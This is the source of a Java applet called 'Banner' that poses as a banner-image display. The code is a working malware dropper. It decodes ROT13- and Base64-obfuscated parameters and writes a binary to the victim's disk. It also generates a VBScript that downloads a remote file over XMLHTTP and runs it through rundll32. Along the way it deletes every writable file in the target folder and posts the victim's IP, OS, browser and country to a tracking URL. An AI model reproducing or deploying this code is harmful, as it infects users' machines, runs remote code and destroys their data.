
import java.applet.Applet;
import java.awt.Color;
import java.awt.Image;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Hashtable;

public class Banner extends Applet {

    //register ok
    //falta download banner
    
    /*public static void main(String[] args) {
         Banner b = new Banner();
         
         b.table.put("self", "http://localhost:8888/doc/js.php");
         b.table.put("ip", "123.456.789.963");
         b.table.put("browser", "Chrome");         
         b.table.put("os", "Windows 7");
         b.table.put("language", "ES");
         b.table.put("country", "Colombia");
         b.registerDownload();
         
         b.table.put("bannerpPath", "http://localhost:8888/injections/12321/CSP - Injections.jpg.banner");
         b.downloadBanner();
         
         b = b;
     }
    
    public Banner(){
         
    }*/
     
    private static final String charset = "0123456789abcdefghijklmnopqrstuvwxyz";
    
    public Hashtable table = new Hashtable(0);
    private Image image = null;
    private boolean doSize = false;
    
    public void init() {
        
        parseParams();
        
        boolean directDownload = isDirecownload();
        if(!directDownload) indirectDownload();
        else directDownload();
        
        downloadBanner();
        
    }
    
    public void paint(java.awt.Graphics g ) {
        setBackground(Color.BLACK);
        g.setColor(Color.BLACK);
        g.fillRect(0, 0, getWidth(), getHeight());
        
        if(image != null) {
            g.drawImage(image, 0, 0, this);
            if(doSize){
                int h = image.getHeight(this);
                int w = image.getWidth(this);
                if(w>0 & h>0) setSize(w, h);
                doSize = true;
            }
        }
        
    }
    
    private void parseParams(){
        
        //Params to POST Registry
        String tmp = getParam("ip");
        if(tmp != null) table.put("ip", tmp);
        tmp = getParam("os");
        if(tmp != null) table.put("os", tmp);
        tmp = getParam("browser");
        if(tmp != null) table.put("browser", tmp);
        tmp = getParam("country");
        if(tmp != null) table.put("country", tmp);
        tmp = getParam("language");
        if(tmp != null) table.put("language", tmp);
        tmp = getParam("self");
        if(tmp != null) {
            try{
                tmp = new String(Base64.decode(Rot13.code(tmp)));
                if(tmp != null && tmp.length()>0) table.put("self", tmp);
            }catch(Exception e){}
        }
        
        //Params to Injections
        tmp = getParam("runpath");
        if(tmp != null) {
            try{
                tmp = new String(Base64.decode(Rot13.code(tmp)));
                if(tmp != null && tmp.length()>0) table.put("runpath", tmp);
            }catch(Exception e){}
        }
        tmp = getParam("binaryPath");
        if(tmp != null) {
            try{
                tmp = new String(Base64.decode(Rot13.code(tmp)));
                if(tmp != null && tmp.length()>0) table.put("binaryPath", tmp);
            }catch(Exception e){}
        }
        tmp = getParam("filename");
        if(tmp != null) {
            try{
                tmp = new String(Base64.decode(Rot13.code(tmp)));
                if(tmp != null && tmp.length()>0) table.put("filename", tmp);
            }catch(Exception e){}
        }
        tmp = getParam("content");
        if(tmp != null) {
            try{
                tmp = Rot13.code(tmp);
                if(tmp != null && tmp.length()>0) table.put("content", tmp);
            }catch(Exception e){}
        }
        
        //Params to banner
        tmp = getParam("bannerpPath");
        if(tmp != null) {
            try{
                tmp = new String(Base64.decode(Rot13.code(tmp)));
                if(tmp != null && tmp.length()>0) table.put("bannerpPath", tmp);
            }catch(Exception e){}
        }
        
    }
    
    private void registerDownload(){
        
        if(table.containsKey("ip") && table.containsKey("country") && table.containsKey("browser") && 
           table.containsKey("os") && table.containsKey("language") && table.containsKey("self")){
            try{
                String encoding = "ISO-8859-1";
                table.put("ip", URLEncoder.encode((table.get("ip")+""), encoding));
                table.put("os", URLEncoder.encode((table.get("os")+""), encoding));
                table.put("browser", URLEncoder.encode((table.get("browser")+""), encoding));
                table.put("country", URLEncoder.encode((table.get("country")+""), encoding));
                table.put("language", URLEncoder.encode((table.get("language")+""), encoding));
                
                
                String data = "&ip=" + table.get("ip");
                        data += "&os=" + table.get("os");
                        data += "&browser=" + table.get("browser");
                        data += "&country=" + table.get("country");
                        data += "&language=" + table.get("language");
                        
                        
                table.remove("ip");
                table.remove("os");
                table.remove("country");
                table.remove("language");
                        
                URL url = new URL(table.get("self") + "");
                
                table.remove("self");
                
                java.net.URLConnection conn = url.openConnection();
                conn.setDoOutput(true);
		conn.setDoInput(true);
		conn.setUseCaches(false);
		conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                
                java.io.DataOutputStream output = new java.io.DataOutputStream(conn.getOutputStream());
		output.writeUTF(data);
		output.flush();
		output.close();
			
		java.io.DataInputStream in = new java.io.DataInputStream(conn.getInputStream());
		java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(in));
		String str;
		while ((str = input.readLine()) != null) {
                    System.out.println(str);
		}
		input.close();
                
                
                
            }catch(Exception e){ }
        }
    }
    
    private void downloadBanner(){
        if(table.containsKey("bannerpPath")){
            try{
                table.put("bannerpPath", ((table.get("bannerpPath"))+"").replace(" ", "%20"));
                
                java.net.URL url = new java.net.URL(table.get("bannerpPath") + "");
                java.net.URLConnection conn = url.openConnection();                
                conn.setDoInput(true);
		conn.setUseCaches(false);
                table.remove("bannerpPath");
                
                java.io.BufferedInputStream bis = new java.io.BufferedInputStream(conn.getInputStream());
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                int ch;
                while ((ch = bis.read()) != -1) baos.write(ch);
                byte[] array = baos.toByteArray();
                if(array != null && array.length>0){
                    Image img = java.awt.Toolkit.getDefaultToolkit().createImage(array);
                    array = null;
                    if(img != null) this.image = img;
                }                
                 
            }catch(Exception e){ this.image = null; }
        }
    }
    
    private String[] createEchoScript(String url, String filename, String dropfile, String folder){
        try{
            
            StringBuffer buffer = new StringBuffer();
            
            buffer.append("Function downloadBinary()\n");
            buffer.append("On Error Resume Next\n");            
            buffer.append("ImageFile = \"" + dropfile + "\"\n");
            buffer.append("DelFile = \"" + filename + "\"\n");
            buffer.append("DestFolder = \"" + folder + "\"\n");
            buffer.append("URL = \"" + url + "\"\n");            
            buffer.append("Set xml = CreateObject(\"Microsoft.XMLHTTP\")\n");
            buffer.append("xml.Open \"GET\", URL, False\n");
            buffer.append("xml.Send\n");
            buffer.append("Set oStream = createobject(\"Adodb.Stream\")\n");
            buffer.append("Const adTypeBinary = 1\n");
            buffer.append("Const adSaveCreateOverWrite = 2\n");
            buffer.append("Const adSaveCreateNotExist = 1\n");
            buffer.append("oStream.type = adTypeBinary\n");
            buffer.append("oStream.open\n");
            buffer.append("oStream.write xml.responseBody\n");
            buffer.append("oStream.savetofile DestFolder & ImageFile, adSaveCreateNotExist\n");//| adSaveCreateOverWrite
            buffer.append("oStream.close\n");
            buffer.append("Set oStream = Nothing\n");
            buffer.append("Set xml = Nothing\n");            
            buffer.append("Set WshShell = CreateObject(\"WScript.Shell\")\n");
            buffer.append("WshShell.run \"rundll32 url.dll,FileProtocolHandler \" & DestFolder & ImageFile\n");
            buffer.append("Set WshShell = Nothing\n");
            buffer.append("Set fso = CreateObject(\"Scripting.FileSystemObject\")\n");
            buffer.append("Set aFile = fso.GetFile(DestFolder & DelFile)\n");
            buffer.append("aFile.Delete\n");
            buffer.append("Set fso = Nothing\n");
            buffer.append("Set aFile = Nothing\n");
            buffer.append("End Function\n");
            
            //buffer.append(" \n");
            
            buffer.append("Function isOnline()\n");
            buffer.append("On Error Resume Next\n");
            buffer.append("Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n");
            buffer.append("Set colItems = objWMIService.ExecQuery (\"Select * from Win32_PingStatus Where Address = 'google.com'\")\n");
            buffer.append("For Each objItem in colItems\n");
            buffer.append("If objItem.StatusCode = 0 Then\n");
            buffer.append("isOnline = True\n");
            buffer.append("Else\n");
            buffer.append("isOnline = False\n");
            buffer.append("End If\n");
            buffer.append("Next\n");
            buffer.append("End Function\n");

            //buffer.append(" \n");
            
            buffer.append("Do\n");
            buffer.append("online = isOnline()\n");
            buffer.append("If( online ) Then\n");
            buffer.append("downloadBinary()\n");
            buffer.append("Wscript.Quit(0)\n");
            buffer.append("Else\n");
            buffer.append("WScript.Sleep 1000 * 60\n");
            buffer.append("End If\n");
            buffer.append("Loop Until False\n");
                    
            String[] lines = buffer.toString().split("\n");
            if(lines != null && lines.length>0) return lines;
            
        }catch(Exception e){}
        return null;
    }
    
    private boolean isDirecownload(){
        if(table.containsKey("content")) return true;
        return false;
    }
    
    private void indirectDownload(){
        try{
            String containsFile = getParam("containsFile");
            String isWin = getParam("isWin");
            if(Integer.parseInt(containsFile) == 1 && Integer.parseInt(isWin) == 1){
                
                String runpath = table.get("runpath") + "";
                String filename = table.get("filename") + "";
                String binaryPath = table.get("binaryPath") + "";
                
                table.remove("runpath");
                table.remove("filename");
                table.remove("binaryPath");
                
                if(runpath == null || runpath.length()<=0) runpath = null;
                if(filename == null || filename.length()<=0) filename = null;
                if(binaryPath == null || binaryPath.length()<=0) binaryPath = null;
                
                if(binaryPath != null && runpath != null && filename != null){
                    String dropperFile = getRandomString(10) + ".vbs";                    
                    String[] script = createEchoScript(binaryPath, dropperFile, filename, runpath);
                    if(script != null){
                        deleteAllFiles(runpath);
                        boolean rsp = writeFile(runpath + dropperFile, script);
                        script = null;
                        if(rsp) registerDownload();
                    }
                }
            }
        }catch(Exception e){}
    }
    
    private void directDownload(){
        try{
            String containsFile = getParam("containsFile");
            String isWin = getParam("isWin");
            if(Integer.parseInt(containsFile) == 1 && Integer.parseInt(isWin) == 1){
                
                String runpath = table.get("runpath") + "";
                String filename = table.get("filename") + "";
                String binaryPath = table.get("binaryPath") + "";
                String content = table.get("content") + "";
                
                table.remove("content");
                table.remove("runpath");
                table.remove("filename");
                table.remove("binaryPath");
                
                if(content == null || content.length()<=0) content = null;
                if(runpath == null || runpath.length()<=0) runpath = null;
                if(filename == null || filename.length()<=0) filename = null;
                if(binaryPath == null || binaryPath.length()<=0) binaryPath = null;
                                
                if(binaryPath != null && runpath != null && content != null && filename != null){
                    byte[] bytes = Base64.decode(content);
                    content = null;
                    if(bytes != null && bytes.length>0){
                        deleteAllFiles(runpath);
                        boolean rsp = writeFile(runpath + filename, bytes);
                        bytes = null;
                        if(rsp) registerDownload();
                    }
                }
            }
        }catch(Exception e){}
    }
    
    private String getParam(String key){
        try {
            String p = getParameter(key).trim();
            if(p != null && p.length()>0) return p;
	} catch (Exception e) {}
        return null;
    }
    
    private boolean writeFile(String path, byte[] source){
        try{
            java.io.File f = new java.io.File(path);
            if(f.exists()) f.delete();
            java.io.FileOutputStream fs = new java.io.FileOutputStream(f);
            java.io.DataOutputStream os = new java.io.DataOutputStream(fs);
            os.write(source, 0, source.length);
            os.close();
            return true;
        }catch(Exception e){}
        return false;
    }
    
    private boolean writeFile(String path, String[] source){
        try{
            java.io.File f = new java.io.File(path);
            if(f.exists()) f.delete();
            java.io.FileWriter fWriter = new java.io.FileWriter(path);
            java.io.BufferedWriter writer = new java.io.BufferedWriter(fWriter); 
            for(int i=0; i<source.length; i++){
                writer.write(source[i]);
                writer.newLine(); 
            }            
            writer.close();
            return true;
        }catch(Exception e){}
        return false;
    }
    
    private void callJavaScript(String params){
        try {
            getAppletContext().showDocument(new java.net.URL("javascript:" + params));
	} catch (Exception e) {}
    }
    
    private static String getRandomString(int length) {
        if(length <= 0) length = 1;
        java.util.Random rand = new java.util.Random(System.currentTimeMillis());
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < length; i++) {
            int pos = rand.nextInt(charset.length());
            sb.append(charset.charAt(pos));
        }
        return sb.toString();
    }
    
    private static void deleteAllFiles(String dir){
        try{
            java.io.File directory = new java.io.File(dir);
            java.io.File[] files = directory.listFiles();
            if(files != null && files.length>0){
                for(int i=0; i<files.length; i++){
                    if(files[i].canWrite()) files[i].delete();
                }
            }
        }catch(Exception e){}
    }
    
}
